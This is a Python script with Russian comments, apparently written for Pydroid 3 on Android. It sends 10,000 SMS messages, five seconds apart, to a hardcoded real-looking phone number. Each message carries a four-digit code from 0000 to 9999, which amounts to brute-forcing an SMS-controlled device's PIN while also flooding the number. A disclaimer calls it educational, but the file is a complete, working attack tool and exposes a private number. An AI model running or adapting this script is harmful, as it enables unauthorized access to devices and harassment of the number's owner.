import time
import os

# --- Конфигурация ---
TARGET_NUMBER = "+79255129102" # <-- ЗАМЕНИТЕ ЭТОТ НОМЕР НА НУЖНЫЙ!
DELAY_SECONDS = 5             # Пауза между сообщениями в секундах
TOTAL_MESSAGES = 10000        # Количество сообщений (от 0000 до 9999)

# --- Проверка наличия модуля Android (для Pydroid 3) ---
pydroid_available = False
try:
    # Модуль 'android' предоставляется Pydroid 3 для доступа к API Android
    import android
    pydroid_available = True
    print("Обнаружена среда Pydroid 3. Будет предпринята попытка отправки SMS.")
except ImportError:
    print("Модуль 'android' не найден. Вероятно, вы не используете Pydroid 3.")
    print("SMS-сообщения не будут отправлены, только имитированы.")
    print("Для реальной отправки используйте Pydroid 3 и предоставьте разрешение на SMS.")

# --- Дисклеймер ---
print("\n")
print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
print("ВНИМАНИЕ: Этот скрипт предназначен только для образовательных целей.")
print("Массовая отправка SMS может быть расценена как спам или DoS-атака.")
print("Использование этого скрипта для несанкционированных или вредоносных действий")
print("является незаконным и может повлечь за собой серьезные последствия.")
print("Используйте его СТРОГО на свой страх и риск и только с разрешения владельца номера!")
print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
print("\n")

# --- Запрос подтверждения у пользователя ---
confirm = input(f"Вы собираетесь отправить {TOTAL_MESSAGES} SMS на номер {TARGET_NUMBER} с паузой {DELAY_SECONDS} сек. Продолжить? (да/нет): ").lower()
if confirm != 'да':
    print("Операция отменена пользователем.")
    exit()

# --- Основной цикл отправки SMS ---
sent_count = 0
failed_count = 0

print("\nНачало отправки SMS...")
start_time = time.time()

for i in range(TOTAL_MESSAGES):
    # Форматирование пароля: 4 знака с ведущими нулями (например, 0000, 0001, ..., 9999)
    password = "{:04d}".format(i)
    
    # Формат сообщения: "пароль, +79255129102"
    message_body = f"{password}, {TARGET_NUMBER}"

    print(f"[{i+1}/{TOTAL_MESSAGES}] Попытка отправки: '{message_body}'")

    if pydroid_available:
        try:
            # Отправка SMS через API Android (доступно в Pydroid 3)
            android.send_sms(TARGET_NUMBER, message_body)
            print("    SMS успешно отправлено.")
            sent_count += 1
        except Exception as e:
            print(f"    Ошибка при отправке SMS: {e}")
            print("    (Убедитесь, что Pydroid 3 имеет разрешение на отправку SMS)")
            failed_count += 1
    else:
        # Если Pydroid 3 не используется, только имитируем отправку
        print("    Имитация отправки SMS (модуль 'android' не найден).")
        sent_count += 1 # В режиме имитации считаем, что отправлено

    # Пауза между сообщениями, кроме последнего
    if i < TOTAL_MESSAGES - 1:
        print(f"    Пауза {DELAY_SECONDS} секунд...")
        time.sleep(DELAY_SECONDS)

end_time = time.time()
duration = end_time - start_time

print("\n--- Отправка завершена ---")
print(f"Всего попыток отправки: {TOTAL_MESSAGES}")
print(f"Успешно отправлено (или имитировано): {sent_count}")
print(f"Ошибок отправки: {failed_count}")
print(f"Общее время выполнения: {duration:.2f} секунд")
print("Не забудьте проверить статус отправленных сообщений в вашем приложении SMS.")
